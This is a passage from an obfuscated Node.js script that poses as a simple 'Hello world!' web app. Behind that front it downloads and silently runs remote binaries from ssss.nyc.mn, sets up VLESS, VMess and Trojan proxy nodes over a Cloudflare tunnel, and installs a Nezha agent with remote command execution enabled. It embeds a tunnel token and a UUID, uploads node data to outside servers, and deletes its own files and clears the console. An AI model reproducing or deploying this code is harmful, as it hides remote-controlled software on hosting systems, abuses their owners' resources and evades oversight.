_0xf93af7=_0x393141;console[_0xf93af7(0x14a)](),console[_0xf93af7(0x137)]('App\x20is\x20running'),console[_0xf93af7(0x137)](_0xf93af7(_0x33198d._0x2013e7));});},0x15f90);}cleanFiles();function _0x48c8(){const _0x521186=['ARGO_DOMAIN','substring','ArgoDomain:','?encryption=none&security=tls&sni=','miget2.lyh.hidns.co','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','5224rxKiSM','\x0aclient_secret:\x20','Nodes\x20uploaded\x20successfully','1255QJpNHp','unlink','\x22\x20>\x20/dev/null\x202>&1','--tls','close','catch','set','web\x20running\x20error:\x20','split','https://arm64.ssss.nyc.mn/web','https://arm64.ssss.nyc.mn/bot','TunnelSecret','org','9757KpsmQs','2053','then','success','ARGO_PORT','push','./tmp','toString','/vless-argo','/trojan-argo','UPLOAD_URL','NEZHA\x20variable\x20is\x20empty,skip\x20running','http://ip-api.com/json/','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','294938RHMjXd','axios','post','nohup\x20','\x0a\x20\x20credentials-file:\x20','\x0a\x20\x20\x20\x20','72128YdIXQG','floor','443','CFPORT','eyJhIjoiNWNmZDhkODFhNTUyMWFkY2ExZDgwNTQwY2I4NjQ5ZTYiLCJ0IjoiOGQxYTA1ZTEtYWRlZi00NDY3LTk4MzYtZDYyZjYwNWRhMTJmIiwicyI6IllUaGxNV1ZpTkdNdFlqRTFNUzAwT0dJekxXSmpNMkl0TnpOalpqRXhOMkkxTlRGaiJ9','response','direct','all','8443','\x20failed:\x20','aarch64','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20-s\x20','2096','firefox','readdirSync','/api/delete-nodes','SERVER_PORT','\x20>/dev/null\x202>&1\x20&','pkill\x20-f\x20\x22[','Error\x20in\x20startserver:','npm\x20running\x20error:\x20','/vmess-argo?ed=2560','send','&fp=firefox&type=ws&host=','none','countryCode','\x20successfully','false','/config.json\x20>/dev/null\x202>&1\x20&','finish','33890gfiyrU','CFIP','UUID','FILE_PATH','readFileSync','base64','https://arm64.ssss.nyc.mn/v1','filter','\x20is\x20running','13348PHzoBo','data','2083','tls','writeFileSync','NEZHA_KEY','log','freedom','7e989a5d-0017-4376-9574-c6b0532cfefb','\x0a\x20\x20tunnel:\x20','config.yaml','boot.log','\x0a\x0avmess://','list.txt','/vmess-argo','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Subscription\x20uploaded\x20successfully','child_process','status','charAt','win32','random','utf-8','\x20-c\x20','Error\x20reading\x20boot.log:','clear','sub.txt','Download\x20','arm','message','https://amd64.ssss.nyc.mn/bot','xtls-rprx-vision','https://amd64.ssss.nyc.mn/web','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','396enkYek','get','tunnel.json','&path=%2Ftrojan-argo%3Fed%3D2560#','Unknown','env','https://oooo.serv00.net/add-url','tunnel.yml','isFile','match','/tunnel.yml\x20run','\x20already\x20exists','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0avless://','https://amd64.ssss.nyc.mn/agent','basename','forEach','Empowerment\x20failed\x20for\x20','rm\x20-rf\x20','ARGO_AUTH','DPgysB5rUuAihUrI3mbKm6vay19sawuv','1259770rZTTxo','test','https+local://8.8.8.8/dns-query','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','existsSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','NAME','NEZHA_SERVER','join','pop','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20-p\x20','listen','automatic\x20access\x20task\x20added\x20successfully','127.0.0.1','Hello\x20world!','tcp','6165OzAfZA','Error\x20downloading\x20files:','/sub.txt\x20saved\x20successfully','express','2087','http\x20server\x20is\x20running\x20on\x20port:','Add\x20automatic\x20access\x20task\x20faild:\x20','.exe\x20>\x20nul\x202>&1','statSync','stringify','platform','abcdefghijklmnopqrstuvwxyz','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','?security=tls&sni=','stream','App\x20is\x20running','unshift','length','\x0a\x0atrojan://','cf.877774.xyz','sub','\x20>\x20nul\x202>&1','PORT','&path=%2Fvless-argo%3Fed%3D2560#','includes','fileName','trojan','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/dev/null','true','vless','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','application/json','error','\x20>/dev/null\x202>&1','Error\x20executing\x20command:\x20','Skipping\x20adding\x20automatic\x20access\x20task','https://amd64.ssss.nyc.mn/v1','arm64','mkdirSync','NEZHA_PORT','amd','SUB_PATH','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','unlinkSync','1459380qYmWNw','from'];_0x48c8=function(){return _0x521186;};return _0x48c8();}async function AddVisitTask(){const _0xc030d4={_0xa06c52:0x105,_0x3cb9b1:0x159,_0x322ca1:0xac,_0x2c09e7:0xd1,_0x4808b9:0xb6},_0x120df1=_0x5eaf48;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x120df1(0x137)](_0x120df1(0xd4));return;}try{const _0x216644=await axios[_0x120df1(_0xc030d4._0xa06c52)](_0x120df1(_0xc030d4._0x3cb9b1),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x120df1(0xd0)}});return console[_0x120df1(0x137)](_0x120df1(_0xc030d4._0x322ca1)),_0x216644;}catch(_0x3328e6){return console[_0x120df1(_0xc030d4._0x2c09e7)](_0x120df1(_0xc030d4._0x4808b9)+_0x3328e6[_0x120df1(0x14e)]),null;}}function _0x160f(_0x3d681d,_0x1e29ad){const _0x48c81d=_0x48c8();return _0x160f=function(_0x160f89,_0xee31ed){_0x160f89=_0x160f89-0xab;let _0x524414=_0x48c81d[_0x160f89];return _0x524414;},_0x160f(_0x3d681d,_0x1e29ad);}async function startserver(){const _0x2e467f={_0x10fa3c:0x11d},_0x4f4468=_0x5eaf48;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x324c6d){console['error'](_0x4f4468(_0x2e467f._0x10fa3c),_0x324c6d);}}startserver()[_0x5eaf48(0xed)](_0x3bd7df=>{const _0x1da69c={_0x40e40e:0xd1},_0x2437ec=_0x5eaf48;console[_0x2437ec(_0x1da69c._0x40e40e)]('Unhandled\x20error\x20in\x20startserver:',_0x3bd7df);}),app[_0x5eaf48(0xab)](PORT,()=>console['log'](_0x5eaf48(0xb5)+PORT+'!'));
